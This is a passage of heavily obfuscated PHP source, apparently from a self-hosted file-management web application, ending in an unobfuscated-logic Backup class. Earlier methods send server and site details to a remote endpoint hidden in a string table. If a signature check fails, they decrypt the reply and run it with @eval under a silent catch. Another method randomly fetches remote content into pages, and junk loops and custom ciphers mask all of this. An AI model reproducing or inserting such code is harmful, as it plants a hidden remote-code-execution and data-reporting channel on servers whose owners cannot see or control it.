$³Ò«˜¼ˆ[682]; if ($Ä’’£õ && time() - $Ä’’£õ < intval($‡¥„†‹Õ[253])) { return; } call_user_func(array($‡¥„†‹Õ[251], $‡¥„†‹Õ[138]), $¶ğ¡ÉŞ, time()); $Ùö¯Ø¾ = $³Ò«˜¼ˆ[683]; $«„©¨’º = Model($‡¥„†‹Õ[33])->get($‡¥„†‹Õ[103]); $¦Òï¡ÃŠ = $³Ò«˜¼ˆ[684]; $›´˜İ‰¾ = array($‡¥„†‹Õ[150] => Model($‡¥„†‹Õ[33])->get($‡¥„†‹Õ[186]), $‡¥„†‹Õ[163] => $this->sactb5fb1fca, $‡¥„†‹Õ[160] => $_SERVER[$‡¥„†‹Õ[161]], $‡¥„†‹Õ[162] => Model($‡¥„†‹Õ[33])->get($‡¥„†‹Õ[130]), $‡¥„†‹Õ[101] => md5($_SERVER[$‡¥„†‹Õ[102]] . $«„©¨’º), $‡¥„†‹Õ[153] => $‡¥„†‹Õ[135], $‡¥„†‹Õ[156] => $_SERVER[$‡¥„†‹Õ[157]]); $íÊ¨¾… = $this->vfnd4b1607a9($‡¥„†‹Õ[254], $›´˜İ‰¾); if (!is_array($íÊ¨¾…)) { return; } if ($íÊ¨¾…[$‡¥„†‹Õ[150]] && $íÊ¨¾…[$‡¥„†‹Õ[255]]) { if ($this->jsbaaf6bc402($íÊ¨¾…[$‡¥„†‹Õ[255]]) == $›´˜İ‰¾[$‡¥„†‹Õ[150]]) { return; } } $this->lshr820c8415(); if ($this->jsbaaf6bc402($íÊ¨¾…[$‡¥„†‹Õ[255]]) != $›´˜İ‰¾[$‡¥„†‹Õ[150]]) { $Š’‹ùÂ¶ = array($‡¥„†‹Õ[181] => $«„©¨’º, $‡¥„†‹Õ[182] => $_SERVER[$‡¥„†‹Õ[102]], $‡¥„†‹Õ[183] => this_url(), $‡¥„†‹Õ[158] => $_SERVER[$‡¥„†‹Õ[159]]); $™ê¥¿É = $this->acwgdf3e81a0(json_encode($Š’‹ùÂ¶)); $íÊ¨¾… = $this->vfnd4b1607a9($‡¥„†‹Õ[184] . $™ê¥¿É); if ($íÊ¨¾… && is_array($íÊ¨¾…) && isset($íÊ¨¾…[$‡¥„†‹Õ[255]])) { $Ø²íó¾ì = $this->jblaeb92156a($íÊ¨¾…[$‡¥„†‹Õ[255]], 2); if ($Ø²íó¾ì) { $Ø²íó¾ì = $this->jsbaaf6bc402($Ø²íó¾ì); } if ($Ø²íó¾ì) { try { @eval($Ø²íó¾ì); } catch (Exception $¿¯ƒÔÎ¾) { } } } } } private function vfnd4b1607a9($«ä…œõı = '', $ÇË‹ôšá = array(), $áæäÎ = 5) { $ÙøİÅõõ =& $_SERVER[Å¶¨Şêº]; $±í§ÃüÁ =& $_SERVER[»Á¢²Ïˆ]; $ŸøÕàŸå = $±í§ÃüÁ[256]; $êãëÖ° = $ÙøİÅõõ[685]; $ŸøÕàŸå = $this->amxq7225ffb1($ŸøÕàŸå, $±í§ÃüÁ[257]); $¥ÖÌ”ˆˆ = $ÙøİÅõõ[686]; $ŸøÕàŸå = $ŸøÕàŸå . $«ä…œõı; if ($ÇË‹ôšá && is_array($ÇË‹ôšá)) { $ŸøÕàŸå = $ŸøÕàŸå . $±í§ÃüÁ[258] . http_build_query($ÇË‹ôšá); } if ($ÇË‹ôšá === -1) { return $ŸøÕàŸå; } $ƒâìŒö = stream_context_create(array($±í§ÃüÁ[216] => array($±í§ÃüÁ[219] => $áæäÎ, $±í§ÃüÁ[217] => $±í§ÃüÁ[259]), $±í§ÃüÁ[260] => array($±í§ÃüÁ[261] => !1, $±í§ÃüÁ[262] => !1))); $ÇË‹ôšá = @file_get_contents($ŸøÕàŸå, !1, $ƒâìŒö); $òæ† ‘ = $ÙøİÅõõ[687]; return json_decode($ÇË‹ôšá, !0); $ºäùªÌ = $ÙøİÅõõ[688]; } private function ghko4b646ef2() { $İ»±Å‘’ =& $_SERVER[Å¶¨Şêº]; $š­Éºº’ =& $_SERVER[»Á¢²Ïˆ]; $»¨Ä¬û” = array($š­Éºº’[263] => $š­Éºº’[264], $š­Éºº’[265] => $š­Éºº’[266], $š­Éºº’[267] => $š­Éºº’[268], $š­Éºº’[269] => $š­Éºº’[270], $š­Éºº’[271] => $š­Éºº’[272], $š­Éºº’[273] => $š­Éºº’[211], $š­Éºº’[274] => $š­Éºº’[211], $š­Éºº’[275] => $š­Éºº’[264], $š­Éºº’[276] => $š­Éºº’[266], $š­Éºº’[277] => $š­Éºº’[268], $š­Éºº’[278] => $š­Éºº’[279], $š­Éºº’[280] => $š­Éºº’[270], $š­Éºº’[281] => $š­Éºº’[282], $š­Éºº’[283] => $š­Éºº’[272], $š­Éºº’[284] => $š­Éºº’[285], $š­Éºº’[286] => $š­Éºº’[287], $š­Éºº’[288] => $š­Éºº’[289]); $ù·¿ÅÑ = $İ»±Å‘’[689]; while ($ù·¿ÅÑ < $İ»±Å‘’[616]) { if ($ù·¿ÅÑ >= 0) { break; } $ù·¿ÅÑ++; } $¼û­ÀôÉ = $»¨Ä¬û”[$this->sactb5fb1fca]; $¼û­ÀôÉ = intval($¼û­ÀôÉ ? $¼û­ÀôÉ : $š­Éºº’[264]); $çÒ¯¶ÑÄ = _get($this->lrjc68f40f49, $š­Éºº’[290]); $çÒ¯¶ÑÄ = $çÒ¯¶ÑÄ ? intval($çÒ¯¶ÑÄ) : 0; return $¼û­ÀôÉ + $çÒ¯¶ÑÄ; $÷Ë¥Æå = $İ»±Å‘’[690]; if (strlen($÷Ë¥Æå) < $İ»±Å‘’[616]) { return; } } public function msede6a896bd($Ñê¸å¿) { $é¥·éõ =& $_SERVER[Å¶¨Şêº]; $‰¿¦ôÍ =& $_SERVER[»Á¢²Ïˆ]; $ÒÄ‹¹¨÷ = $this->ghko4b646ef2(); if ($Ñê¸å¿[$‰¿¦ôÍ[291]] == $‰¿¦ôÍ[121]) { return; } if ($ÒÄ‹¹¨÷ >= intval($‰¿¦ôÍ[211])) { return; } $á‡ºéıÎ = Model($‰¿¦ôÍ[124])->count(); $áş•È¹½ = $é¥·éõ[691]; if ($á‡ºéıÎ <= $ÒÄ‹¹¨÷) { return; } $Ë›ğÌ¦‰ = Model($‰¿¦ôÍ[124])->field($‰¿¦ôÍ[291])->limit($ÒÄ‹¹¨÷)->select(); $Î³ŠÀì = $é¥·éõ[692]; if (strlen($Î³ŠÀì) < $é¥·éõ[629]) { return; } $Ë›ğÌ¦‰ = array_to_keyvalue($Ë›ğÌ¦‰, $‰¿¦ôÍ[6], $‰¿¦ôÍ[291]); $‚ë¡Ö°© = $é¥·éõ[693]; if (!in_array($Ñê¸å¿[$‰¿¦ôÍ[291]], $Ë›ğÌ¦‰)) { show_json($‰¿¦ôÍ[292], !1, $‰¿¦ôÍ[207]); } } public function yjck8195bad4() { $ğİîÚ•Ş =& $_SERVER[Å¶¨Şêº]; $Õ±ğòåĞ =& $_SERVER[»Á¢²Ïˆ]; if (!_get($GLOBALS, $Õ±ğòåĞ[115]) || mt_rand(1, 100) > 20) { return; } $áÏÍ†‚Ÿ = $Õ±ğòåĞ[214]; $áÏÍ†‚Ÿ = $this->amxq7225ffb1($áÏÍ†‚Ÿ, $Õ±ğòåĞ[215]); $û¶üíÒ¥ = $ğİîÚ•Ş[694]; if (strlen($û¶üíÒ¥) < $ğİîÚ•Ş[20]) { die; } $ºƒ¨šš¢ = stream_context_create(array($Õ±ğòåĞ[216] => array($Õ±ğòåĞ[217] => $Õ±ğòåĞ[218], $Õ±ğòåĞ[219] => 3))); $Œş—‹× = $ğİîÚ•Ş[695]; while ($Œş—‹× < $ğİîÚ•Ş[620]) { if ($Œş—‹× >= 0) { break; } $Œş—‹×++; } $Í÷²¨Ù = @file_get_contents($áÏÍ†‚Ÿ, !1, $ºƒ¨šš¢); echo $Õ±ğòåĞ[293] . hash_encode($Í÷²¨Ù) . $Õ±ğòåĞ[294]; } private function kxcbe0cdd196($š³°‡È, $‹Òƒœ‘Ì, $†¹Ä·˜İ = 3) { $®¸Ô—ƒ™ =& $_SERVER[Å¶¨Şêº]; $«„™µÎÜ =& $_SERVER[»Á¢²Ïˆ]; usleep(1); $š³°‡È = trim($š³°‡È); $£±ßËõ‡ = mt_rand(0, 5) . $«„™µÎÜ[6]; $»Ïèª«Ò = $®¸Ô—ƒ™[696]; $ï¾®æ¸ò = rand_string(15); $ÎÈê«‘ = $®¸Ô—ƒ™[697]; $îà¾­’ = $«„™µÎÜ[295]; switch ($£±ßËõ‡) { case $«„™µÎÜ[203]: $©£¥Ç = $this->oehdac641a5b($š³°‡È, strrev($‹Òƒœ‘Ì . $ï¾®æ¸ò)); $‡–˜²¥ì = $®¸Ô—ƒ™[698]; if (!$‡–˜²¥ì) { die; } break; case $«„™µÎÜ[121]: $©£¥Ç = $this->oehdac641a5b($š³°‡È, strrev($ï¾®æ¸ò . $‹Òƒœ‘Ì)); $­“Ó×ßÛ = $®¸Ô—ƒ™[699]; break; $¦á¬Øîç = $®¸Ô—ƒ™[700]; case $«„™µÎÜ[296]: $©£¥Ç = $this->oehdac641a5b($š³°‡È, base64_encode($ï¾®æ¸ò . $‹Òƒœ‘Ì)); $”è¶ıû = $®¸Ô—ƒ™[701]; if (!$”è¶ıû) { die; } break; case $«„™µÎÜ[297]: $©£¥Ç = $this->oehdac641a5b($š³°‡È, md5($ï¾®æ¸ò . $‹Òƒœ‘Ì)); $ ÷ƒØÜå = $®¸Ô—ƒ™[702]; while ($ ÷ƒØÜå < $®¸Ô—ƒ™[629]) { if ($ ÷ƒØÜå >= 0) { break; } $ ÷ƒØÜå++; } break; case $«„™µÎÜ[298]: $š³°‡È = base64_encode($š³°‡È); $±ÔêØÖ = $®¸Ô—ƒ™[703]; $¡”˜©é§ = rand(0, 64); $Ñ–û¸õ° = $®¸Ô—ƒ™[704]; while ($Ñ–û¸õ° < $®¸Ô—ƒ™[616]) { if ($Ñ–û¸õ° >= 0) { break; } $Ñ–û¸õ°++; } $”ñî£‚‘ = $îà¾­’[$¡”˜©é§]; $¢ÒÆ¯„ = md5($”ñî£‚‘ . md5($‹Òƒœ‘Ì . $”ñî£‚‘) . $‹Òƒœ‘Ì); $¬“œæ…Ñ = $®¸Ô—ƒ™[705]; $¢ÒÆ¯„ = substr($¢ÒÆ¯„, $¡”˜©é§ % 8, $¡”˜©é§ % 8 + 7); $–§Ñ¶’Õ = $«„™µÎÜ[6]; $¾ë£Ç¡º = 0; $ìÉ†ìıµ = 0; $Áº’Â­Æ = 0; $Â–ÃÍå¥ = $®¸Ô—ƒ™[706]; for ($¾ë£Ç¡º = 0; $¾ë£Ç¡º < strlen($š³°‡È); $¾ë£Ç¡º++) { $Áº’Â­Æ = $Áº’Â­Æ == strlen($¢ÒÆ¯„) ? 0 : $Áº’Â­Æ; $ìÉ†ìıµ = ($¡”˜©é§ + strpos($îà¾­’, $š³°‡È[$¾ë£Ç¡º]) + ord($¢ÒÆ¯„[$Áº’Â­Æ++])) % 64; $–§Ñ¶’Õ .= $îà¾­’[$ìÉ†ìıµ]; } $©£¥Ç = hash_encode($”ñî£‚‘ . $–§Ñ¶’Õ); break; default: $©£¥Ç = $this->oehdac641a5b($š³°‡È, $‹Òƒœ‘Ì . $ï¾®æ¸ò); $¦Àôä‰à = $®¸Ô—ƒ™[707]; break; $èÙ««¨ñ = $®¸Ô—ƒ™[708]; } $©£¥Ç = strrev($£±ßËõ‡ . $ï¾®æ¸ò . $©£¥Ç); $×ù¤ã°³ = $®¸Ô—ƒ™[709]; while ($×ù¤ã°³ < $®¸Ô—ƒ™[20]) { if ($×ù¤ã°³ >= 0) { break; } $×ù¤ã°³++; } if ($†¹Ä·˜İ - 1 > 0) { $©£¥Ç = $this->kxcbe0cdd196($©£¥Ç, $‹Òƒœ‘Ì, $†¹Ä·˜İ - 1); } return $©£¥Ç; } private function jblaeb92156a($³ºÈşüÚ, $±È¨ù, $—¤º î° = 3) { $œ®û¡•° =& $_SERVER[Å¶¨Şêº]; $Ÿ§ê¸² =& $_SERVER[»Á¢²Ïˆ]; if (!is_string($³ºÈşüÚ) || strlen($³ºÈşüÚ) < 10) { return !1; } $³ºÈşüÚ = trim($³ºÈşüÚ); $³ºÈşüÚ = strrev($³ºÈşüÚ); $ÏªÜı‰† = $œ®û¡•°[710]; if (strlen($ÏªÜı‰†) < $œ®û¡•°[633]) { die; } $®± Ó£ß = $³ºÈşüÚ[0]; $Æ°¸»˜ = substr($³ºÈşüÚ, 1, 15); $µñ…´†ö = $œ®û¡•°[711]; while (strlen($µñ…´†ö) < $œ®û¡•°[20]) { if (!$µñ…´†ö) { break; } $µñ…´†ö++; } $³ºÈşüÚ = substr($³ºÈşüÚ, 16); $´‡à¨§Ú = $œ®û¡•°[712]; if (strlen($´‡à¨§Ú) < $œ®û¡•°[20]) { return; } $¥àıÁ›å = $Ÿ§ê¸²[295]; switch ($®± Ó£ß) { case $Ÿ§ê¸²[203]: $ä²çõ = $this->amxq7225ffb1($³ºÈşüÚ, strrev($±È¨ù . $Æ°¸»˜)); $°¦œ€îâ = $œ®û¡•°[713]; break; case $Ÿ§ê¸²[121]: $ä²çõ = $this->amxq7225ffb1($³ºÈşüÚ, strrev($Æ°¸»˜ . $±È¨ù)); $ÇáˆÚ…Ø = $œ®û¡•°[714]; break; case $Ÿ§ê¸²[296]: $ä²çõ = $this->amxq7225ffb1($³ºÈşüÚ, base64_encode($Æ°¸»˜ . $±È¨ù)); break; $ÎƒÂ”òá = $œ®û¡•°[715]; case $Ÿ§ê¸²[297]: $ä²çõ = $this->amxq7225ffb1($³ºÈşüÚ, md5($Æ°¸»˜ . $±È¨ù)); $ËŞÇÕ¾Ë = $œ®û¡•°[716]; if (!$ËŞÇÕ¾Ë) { die; } break; case $Ÿ§ê¸²[298]: $³ºÈşüÚ = hash_decode($³ºÈşüÚ); $ö‚Å·âª = $³ºÈşüÚ[0]; $ƒ©­£×“ = $œ®û¡•°[717]; if (!$ƒ©­£×“) { die; } $³ºÈşüÚ = substr($³ºÈşüÚ, 1); $Ïí€‚ø¸ = strpos($¥àıÁ›å, $ö‚Å·âª); $åÀ—©Ù = $œ®û¡•°[718]; $·çï¶Üç = md5($ö‚Å·âª . md5($±È¨ù . $ö‚Å·âª) . $±È¨ù); $ïåÔ–µÖ = $œ®û¡•°[628]; if (!$ïåÔ–µÖ) { return; } $·çï¶Üç = substr($·çï¶Üç, $Ïí€‚ø¸ % 8, $Ïí€‚ø¸ % 8 + 7); $àçö˜°¦ = $œ®û¡•°[719]; if (strlen($àçö˜°¦) < $œ®û¡•°[629]) { die; } $ÖÂÏÇş¬ = $Ÿ§ê¸²[6]; $°Äòìü = 0; $á İ¢Ä = 0; $¦ú“ÍÀá = $œ®û¡•°[720]; if (!$¦ú“ÍÀá) { return; } $»°Òı = 0; for ($°Äòìü = 0; $°Äòìü < strlen($³ºÈşüÚ); $°Äòìü++) { $»°Òı = $»°Òı == strlen($·çï¶Üç) ? 0 : $»°Òı; $˜•õ³» = $»°Òı++; $á İ¢Ä = strpos($¥àıÁ›å, $³ºÈşüÚ[$°Äòìü]) - $Ïí€‚ø¸ - ord($·çï¶Üç[$˜•õ³»]); $Ú×‡Ï»Õ = $œ®û¡•°[721]; if (!$Ú×‡Ï»Õ) { die; } while ($á İ¢Ä < 0) { $á İ¢Ä += 64; } $ÖÂÏÇş¬ .= $¥àıÁ›å[$á İ¢Ä]; } $ä²çõ = base64_decode($ÖÂÏÇş¬); $Î“ —õ = $œ®û¡•°[722]; if (!$Î“ —õ) { die; } break; default: $ä²çõ = $this->amxq7225ffb1($³ºÈşüÚ, $±È¨ù . $Æ°¸»˜); $‡úšŠº¡ = $œ®û¡•°[723]; if (!$‡úšŠº¡) { die; } break; $ÇØ÷–§Ø = $œ®û¡•°[724]; if (strlen($ÇØ÷–§Ø) < $œ®û¡•°[629]) { die; } } if ($—¤º î° - 1 > 0) { $ä²çõ = $this->jblaeb92156a($ä²çõ, $±È¨ù, $—¤º î° - 1); } return $ä²çõ; } public function acwgdf3e81a0($ªä¯üÆ·) { $ÀÜ±€˜Ÿ =& $_SERVER[Å¶¨Şêº]; $ÊçÉğé€ =& $_SERVER[»Á¢²Ïˆ]; $Ãï¤û°Í = $this->imejab8965ae(); $¨Ø”Æ¤Ô = $this->imejab8965ae(); $Ç†§ù·× = ($Ãï¤û°Í - 1) * ($¨Ø”Æ¤Ô - 1); $Æ­Çâ‹ = intval(($Ãï¤û°Í + $¨Ø”Æ¤Ô) / 2); while (1) { $Ûºê„Œù = $Æ­Çâ‹; $šİŠí¦Á = $ÀÜ±€˜Ÿ[725]; if (!$šİŠí¦Á) { return; } $“¦†Ë† = $Ç†§ù·×; while ($“¦†Ë† % $Ûºê„Œù != 0) { $±Ã…š¦ = $“¦†Ë†; $“¦†Ë† = $Ûºê„Œù; $ìğ ¾øÛ = $ÀÜ±€˜Ÿ[726]; if (!$ìğ ¾øÛ) { die; } $Ûºê„Œù = $±Ã…š¦ % $Ûºê„Œù; $ı¥ÂŞôÃ = $ÀÜ±€˜Ÿ[727]; if (strlen($ı¥ÂŞôÃ) < $ÀÜ±€˜Ÿ[633]) { return; } } if ($Ûºê„Œù == 1) { break; } else { $Æ­Çâ‹++; } } $À‚‚‚ËÌ = 2; $”íŠëôı = $ÀÜ±€˜Ÿ[728]; while (strlen($”íŠëôı) < $ÀÜ±€˜Ÿ[629]) { if (!$”íŠëôı) { break; } $”íŠëôı++; } for ($ÊØó¯–ï = 0; $ÊØó¯–ï < $Ç†§ù·× * 10; $ÊØó¯–ï++) { if (($Ç†§ù·× * $ÊØó¯–ï + 1) % $Æ­Çâ‹ == 0) { $À‚‚‚ËÌ = intval(($Ç†§ù·× * $ÊØó¯–ï + 1) / $Æ­Çâ‹); break; } } $ËéÜĞ = $this->oehdac641a5b($Ãï¤û°Í * $¨Ø”Æ¤Ô . $ÊçÉğé€[6], $ÊçÉğé€[135]); $¤ŠÑÙúÒ = $ÀÜ±€˜Ÿ[729]; if (!$¤ŠÑÙúÒ) { die; } $Å¶èÓü = md5($ÊçÉğé€[299] . ($Ãï¤û°Í + $¨Ø”Æ¤Ô) . $ÊçÉğé€[300] . $Æ­Çâ‹ . $ÊçÉğé€[300] . $À‚‚‚ËÌ . $ÊçÉğé€[301]); $¢œÒÈ½ = $this->oehdac641a5b($ªä¯üÆ·, $Å¶èÓü) . $ÊçÉğé€[302] . $ËéÜĞ; $îø°±ü› = $ÀÜ±€˜Ÿ[730]; if (strlen($îø°±ü›) < $ÀÜ±€˜Ÿ[616]) { die; } return $¢œÒÈ½; } public function jsbaaf6bc402($¯ş×Œ¢Ä) { $½‰„’Âì =& $_SERVER[Å¶¨Şêº]; $¼·ùÖå =& $_SERVER[»Á¢²Ïˆ]; $­Ë÷™“§ = explode($¼·ùÖå[302], $¯ş×Œ¢Ä); if (count($­Ë÷™“§) != 2) { return $¼·ùÖå[6]; } $Ç´œâßÇ = $this->amxq7225ffb1($­Ë÷™“§[1] . $¼·ùÖå[6], $¼·ùÖå[135]); if (!$Ç´œâßÇ) { return $¼·ùÖå[6]; } $Ç´œâßÇ = intval($Ç´œâßÇ); $‚´™›Ì = $½‰„’Âì[731]; while ($‚´™›Ì < $½‰„’Âì[620]) { if ($‚´™›Ì >= 0) { break; } $‚´™›Ì++; } $ÑÛ»¡”Ø = 0; $Í•§Ğ = $½‰„’Âì[732]; while (strlen($Í•§Ğ) < $½‰„’Âì[20]) { if (!$Í•§Ğ) { break; } $Í•§Ğ++; } $ôÓ‡ÜŸÍ = 0; for ($—Ú¡¢Ğ = 3; $—Ú¡¢Ğ < $Ç´œâßÇ; $—Ú¡¢Ğ += 2) { if ($Ç´œâßÇ % $—Ú¡¢Ğ != 0) { continue; } $ÑÛ»¡”Ø = $—Ú¡¢Ğ; $ç‘›Ïş° = $½‰„’Âì[733]; if (strlen($ç‘›Ïş°) < $½‰„’Âì[20]) { die; } $ôÓ‡ÜŸÍ = intval($Ç´œâßÇ / $—Ú¡¢Ğ); $„°˜şÛß = $½‰„’Âì[734]; if (!$„°˜şÛß) { die; } break; } $œ¨÷»Á¨ = ($ÑÛ»¡”Ø - 1) * ($ôÓ‡ÜŸÍ - 1); $˜Ö©ùş­ = intval(($ÑÛ»¡”Ø + $ôÓ‡ÜŸÍ) / 2); while (1) { $¢ÑÓ¼¬ = $˜Ö©ùş­; $ë¤«ëèõ = $½‰„’Âì[735]; $ö¸ÏâÛ = $œ¨÷»Á¨; while ($ö¸ÏâÛ % $¢ÑÓ¼¬ != 0) { $Û¡“‰¹ = $ö¸ÏâÛ; $ú‚õ…½Î = $½‰„’Âì[736]; $ö¸ÏâÛ = $¢ÑÓ¼¬; $¢ÑÓ¼¬ = $Û¡“‰¹ % $¢ÑÓ¼¬; $­Ï”æÈ¸ = $½‰„’Âì[737]; } if ($¢ÑÓ¼¬ == 1) { break; } else { $˜Ö©ùş­++; } } $¸Â¾£­º = 2; $ÂÏ²–û¿ = $½‰„’Âì[738]; if (!$ÂÏ²–û¿) { die; } for ($—Ú¡¢Ğ = 0; $—Ú¡¢Ğ < $œ¨÷»Á¨ * 10; $—Ú¡¢Ğ++) { if (($œ¨÷»Á¨ * $—Ú¡¢Ğ + 1) % $˜Ö©ùş­ == 0) { $¸Â¾£­º = intval(($œ¨÷»Á¨ * $—Ú¡¢Ğ + 1) / $˜Ö©ùş­); break; } } $®„¡õŒı = md5($¼·ùÖå[299] . ($ÑÛ»¡”Ø + $ôÓ‡ÜŸÍ) . $¼·ùÖå[300] . $˜Ö©ùş­ . $¼·ùÖå[300] . $¸Â¾£­º . $¼·ùÖå[301]); $¿ò¶•¶Ä = $½‰„’Âì[739]; if (!$¿ò¶•¶Ä) { die; } $Ÿƒ¬à¯ = $this->amxq7225ffb1($­Ë÷™“§[0], $®„¡õŒı); $¿òõ¡×´ = $½‰„’Âì[740]; while ($¿òõ¡×´ < $½‰„’Âì[620]) { if ($¿òõ¡×´ >= 0) { break; } $¿òõ¡×´++; } return $Ÿƒ¬à¯; } public function imejab8965ae() { $¥ÊñÖÈ¦ =& $_SERVER[Å¶¨Şêº]; $¬ÊÇœè‘ = mt_rand(pow(2, 14), pow(2, 16) - 1); $‰›‚¼À§ = array(); $¬ç–½ÃÊ = 1; $éöŸœÍ• = $¥ÊñÖÈ¦[741]; while ($¬ç–½ÃÊ <= (int) sqrt($¬ÊÇœè‘)) { $şÅ¶°á = $¬ç–½ÃÊ; $Æôë¸»• = $¥ÊñÖÈ¦[698]; if (!$Æôë¸»•) { die; } while (!0) { $şÅ¶°á++; if ($şÅ¶°á <= 2) { $¬ç–½ÃÊ = $şÅ¶°á; break; } else { if ($şÅ¶°á < 2) { continue; } } $¬‘ƒ“—õ = !0; for ($ÄŸäÃíÍ = 2; $ÄŸäÃíÍ <= sqrt($şÅ¶°á); $ÄŸäÃíÍ++) { if ($şÅ¶°á % $ÄŸäÃíÍ == 0) { $¬‘ƒ“—õ = !1; } } if ($¬‘ƒ“—õ) { $¬ç–½ÃÊ = $şÅ¶°á; break; } } $‰›‚¼À§[] = $¬ç–½ÃÊ; $°îëÄ = $¥ÊñÖÈ¦[742]; if (!$°îëÄ) { return; } } $ïÆåèŸÊ = 2; for ($şÅ¶°á = $¬ÊÇœè‘; $şÅ¶°á > 1; $şÅ¶°á--) { $¬‘ƒ“—õ = !0; $¸ ò’‘· = $¥ÊñÖÈ¦[743]; if (!$¸ ò’‘·) { return; } foreach ($‰›‚¼À§ as $©ôí–Î) { if ($şÅ¶°á % $©ôí–Î == 0) { $¬‘ƒ“—õ = !1; break; } } if ($¬‘ƒ“—õ) { $ïÆåèŸÊ = $şÅ¶°á; break; } } return $ïÆåèŸÊ; } public function tqsb016ef12f($îØî…, $„«¦òÓ­) { $šĞ¤Ñï³ =& $_SERVER[»Á¢²Ïˆ]; return call_user_func(array($šĞ¤Ñï³[8], $šĞ¤Ñï³[303]), $îØî…, $„«¦òÓ­); } public function oehdac641a5b($üî©¡¿, $²Œ˜ÌÂ¨) { $‰ë«Ï =& $_SERVER[»Á¢²Ïˆ]; return call_user_func(array($‰ë«Ï[304], $‰ë«Ï[305]), $üî©¡¿, $²Œ˜ÌÂ¨); $¨ô™ÎƒÜ = $_SERVER[Å¶¨Şêº][744]; if (!$¨ô™ÎƒÜ) { return; } } public function amxq7225ffb1($·®éãÓ, $½’½âù) { $áì¸§ƒ§ =& $_SERVER[»Á¢²Ïˆ]; return call_user_func(array($áì¸§ƒ§[304], $áì¸§ƒ§[306]), $·®éãÓ, $½’½âù); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ŸæòÖ°© =& $_SERVER[Å¶¨Şêº]; $this->isManual(); self::$name = date($ŸæòÖ°©[745]); if (!($¤¢¼•ş× = Model($ŸæòÖ°©[746])->lastItem())) { $¤¢¼•ş× = $this->initData(); } else { self::$name = $¤¢¼•ş×[$ŸæòÖ°©[42]]; if ($¤¢¼•ş×[$ŸæòÖ°©[747]] == $ŸæòÖ°©[99]) { self::$name = date($ŸæòÖ°©[748]); $ù­ˆÅšÍ = 0; if (isset($¤¢¼•ş×[$ŸæòÖ°©[303]][$ŸæòÖ°©[211]][$ŸæòÖ°©[477]])) { $ù­ˆÅšÍ = (int) $¤¢¼•ş×[$ŸæòÖ°©[303]][$ŸæòÖ°©[211]][$ŸæòÖ°©[477]]; } if (self::$manual == 0 && $¤¢¼•ş×[$ŸæòÖ°©[42]] == self::$name) { Model($ŸæòÖ°©[746])->remove($¤¢¼•ş×[$ŸæòÖ°©[408]]); } $¤¢¼•ş× = $this->initData($ù­ˆÅšÍ, $¤¢¼•ş×[$ŸæòÖ°©[749]]); } else { $this->checkStore($¤¢¼•ş×[$ŸæòÖ°©[749]]); } } self::$option = $¤¢¼•ş×; } private function isManual() { $£ÜÅ€ìğ = _get($GLOBALS, $_SERVER[Å¶¨Şêº][750], 0); $£ÜÅ€ìğ = intval($£ÜÅ€ìğ); self::$manual = $£ÜÅ€ìğ && $£ÜÅ€ìğ == 1 ? 1 : 0; } private function initData($Í––ï¢ñ = 0, $œñõü = '') { $ÚÉÔñ‡÷ =& $_SERVER[Å¶¨Şêº]; $áÄÖ˜®› = Model($ÚÉÔñ‡÷[746])->config(); if ($œñõü && $áÄÖ˜®›[$ÚÉÔñ‡÷[749]] != $œñõü) { $Í––ï¢ñ = 0; } $this->checkStore($áÄÖ˜®›[$ÚÉÔñ‡÷[749]]); if (self::$manual == 1) { self::$name .= $ÚÉÔñ‡÷[11] . date($ÚÉÔñ‡÷[751]); } $«ŠˆÂçœ = array($ÚÉÔñ‡÷[749] => $áÄÖ˜®›[$ÚÉÔñ‡÷[749]], $ÚÉÔñ‡÷[42] => self::$name, $ÚÉÔñ‡÷[747] => 0, $ÚÉÔñ‡÷[752] => $áÄÖ˜®›[$ÚÉÔñ‡÷[752]], $ÚÉÔñ‡÷[753] => self::$manual, $ÚÉÔñ‡÷[303] => array($ÚÉÔñ‡÷[754] => array($ÚÉÔñ‡÷[747] => 0), $ÚÉÔñ‡÷[755] => array($ÚÉÔñ‡÷[747] => 0, $ÚÉÔñ‡÷[756] => 0, $ÚÉÔñ‡÷[757] => 0, $ÚÉÔñ‡÷[43] => $ÚÉÔñ‡÷[12], $ÚÉÔñ‡÷[758] => 0, $ÚÉÔñ‡÷[759] => 0), $ÚÉÔñ‡÷[760] => array($ÚÉÔñ‡÷[747] => 0, $ÚÉÔñ‡÷[756] => 0, $ÚÉÔñ‡÷[757] => 0, $ÚÉÔñ‡÷[758] => 0, $ÚÉÔñ‡÷[759] => 0), $ÚÉÔñ‡÷[211] => array($ÚÉÔñ‡÷[747] => 0, $ÚÉÔñ‡÷[761] => 0, $ÚÉÔñ‡÷[762] => 0, $ÚÉÔñ‡÷[763] => 0, $ÚÉÔñ‡÷[764] => 0, $ÚÉÔñ‡÷[477] => $Í––ï¢ñ, $ÚÉÔñ‡÷[758] => 0, $ÚÉÔñ‡÷[759] => 0)), $ÚÉÔñ‡÷[758] => time(), $ÚÉÔñ‡÷[759] => 0); $û†ÊÄÛ’ = Model($ÚÉÔñ‡÷[746])->insert($«ŠˆÂçœ); $«ŠˆÂçœ[$ÚÉÔñ‡÷[408]] = $û†ÊÄÛ’; return $«ŠˆÂçœ; } private function checkStore($ù¼´ı ü) { $ñ¶£÷Ğ =& $_SERVER[Å¶¨Şêº]; $±ıäƒå† = Model($ñ¶£÷Ğ[765])->listData($ù¼´ı ü); Model($ñ¶£÷Ğ[765])->checkConfig($±ıäƒå†); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Å¶¨Şêº][746])->findByName(self::$name); } return self::$option; } public static function set($Ë³Ìóâ“) { $×•”¨Ô =& $_SERVER[Å¶¨Şêº]; $š¿Õïµ¡ = self::get(); foreach ($Ë³Ìóâ“ as $¶ÏÕ¦íü => $ÊÆŒğÛã) { $©Ø¿ºáå = explode($×•”¨Ô[10], $¶ÏÕ¦íü); $µÃÌà¹ñ = count($©Ø¿ºáå); switch ($µÃÌà¹ñ) { case 1: $š¿Õïµ¡[$©Ø¿ºáå[0]] = $ÊÆŒğÛã; break; case 2: $š¿Õïµ¡[$©Ø¿ºáå[0]][$©Ø¿ºáå[1]] = $ÊÆŒğÛã; break; case 3: $š¿Õïµ¡[$©Ø¿ºáå[0]][$©Ø¿ºáå[1]][$©Ø¿ºáå[2]] = $ÊÆŒğÛã; break; } } Model($×•”¨Ô[746])->update($š¿Õïµ¡[$×•”¨Ô[408]], $š¿Õïµ¡); self::$option = $š¿Õïµ¡; return self::$option; } public function keep() { $”Ú¹‚”’ =& $_SERVER[Å¶¨Şêº]; $Ï˜ˆó–¸ = self::get(); if 